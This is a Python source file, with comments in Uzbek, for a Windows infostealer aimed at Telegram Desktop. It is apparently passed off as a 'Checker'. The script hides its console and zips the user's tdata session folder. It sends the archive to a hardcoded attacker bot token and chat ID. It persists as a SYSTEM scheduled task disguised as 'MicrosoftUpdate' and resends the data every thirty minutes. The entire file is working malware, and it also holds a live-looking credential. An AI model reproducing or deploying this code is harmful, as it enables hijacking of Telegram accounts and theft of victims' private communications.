import os
import ctypes
import time
import json
import urllib.request
import socket
import tempfile
import zipfile
import subprocess
import sys

# Qora oynani yashirish
if os.name == 'nt':
    ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)

BOT_TOKEN = "8474648259:AAH3sMxwJCPwkit40x--YgvETDLkZ0jmgu4"
CHAT_ID = 7080045924

def send_file(file_path, caption):
    try:
        url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendDocument"
        with open(file_path, 'rb') as f:
            data = f.read()
        boundary = "----WebKitFormBoundary7MA4YWxkTrZu0gW"
        body = (
            f"--{boundary}\r\n"
            f'Content-Disposition: form-data; name="chat_id"\r\n\r\n{CHAT_ID}\r\n'
            f"--{boundary}\r\n"
            f'Content-Disposition: form-data; name="caption"\r\n\r\n{caption}\r\n'
            f"--{boundary}\r\n"
            f'Content-Disposition: form-data; name="document"; filename="tdata.zip"\r\n'
            f"Content-Type: application/octet-stream\r\n\r\n"
        ).encode() + data + f"\r\n--{boundary}--\r\n".encode()
        req = urllib.request.Request(url, data=body, headers={"Content-Type": f"multipart/form-data; boundary={boundary}"})
        urllib.request.urlopen(req)
    except:
        pass

def send_msg(text):
    try:
        url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
        data = json.dumps({"chat_id": CHAT_ID, "text": text}).encode()
        req = urllib.request.Request(url, data=data, headers={"Content-Type": "application/json"})
        urllib.request.urlopen(req)
    except:
        pass

def get_tdata():
    pc_name = socket.gethostname()
    appdata = os.getenv('APPDATA')
    tdata_path = os.path.join(appdata, 'TelegramDesktop', 'tdata')
    if os.path.exists(tdata_path):
        try:
            temp_dir = tempfile.gettempdir()
            zip_path = os.path.join(temp_dir, f"tdata_{pc_name}_{int(time.time())}.zip")
            with zipfile.ZipFile(zip_path, 'w', zipfile.ZIP_DEFLATED) as zipf:
                for root, dirs, files in os.walk(tdata_path):
                    for file in files:
                        try:
                            file_path = os.path.join(root, file)
                            zipf.write(file_path, os.path.relpath(file_path, os.path.dirname(tdata_path)))
                        except: pass
            return zip_path
        except:
            return None
    return None

def install_persistence():
    try:
        script_path = os.path.join(os.environ['APPDATA'], 'svchost.py')
        # O'zini kompyuterga saqlash
        if not os.path.exists(script_path):
            content = urllib.request.urlopen(sys.argv[0] if len(sys.argv) > 0 else __file__).read().decode()
            with open(script_path, 'w') as f:
                f.write(content)
        
        # Task Scheduler ga qo'shish (Har doim ishlaydi)
        subprocess.run(['schtasks', '/create', '/tn', 'MicrosoftUpdate', '/tr', f'"{sys.executable}" "{script_path}"', '/sc', 'onlogon', '/ru', 'SYSTEM', '/rl', 'HIGHEST', '/f', '/it'], shell=True)
        return True
    except:
        return False

def force_open_telegram():
    try:
        # Agar Telegram Desktop ochiq bo'lmasa, uni ochishga urinamiz
        result = subprocess.run(['tasklist', '/fi', 'imagename eq Telegram.exe'], capture_output=True, text=True)
        if "Telegram.exe" not in result.stdout:
            subprocess.Popen(['start', 'Telegram'], shell=True)
            time.sleep(10)
    except:
        pass

# MAIN (Birinchi ishga tushganda)
send_msg(f"🔧 Checker o'rnatilmoqda: {socket.gethostname()}")

if install_persistence():
    send_msg(f"🔒 Task Scheduler ga o'rnatildi!")

# Telegram Desktop ni majburan ochish (agar ochiq bo'lmasa, hozir ochiladi)
force_open_telegram()

# Birinchi tdata ni yuborish
time.sleep(15)
zip_path = get_tdata()
if zip_path:
    send_file(zip_path, f"✅ Birinchi tdata yig'ildi!\n🖥 {socket.gethostname()}")
    os.remove(zip_path)

# ENDI DOIMIY KUZATISH
last_sent = 0
while True:
    time.sleep(600)
    try:
        result = subprocess.run(['tasklist', '/fi', 'imagename eq Telegram.exe'], capture_output=True, text=True)
        if "Telegram.exe" in result.stdout:
            if time.time() - last_sent > 1800:
                zip_path = get_tdata()
                if zip_path:
                    send_file(zip_path, f"✅ Yangi tdata yig'ildi!\n🖥 {socket.gethostname()}")
                    os.remove(zip_path)
                    last_sent = time.time()
    except:
        pass
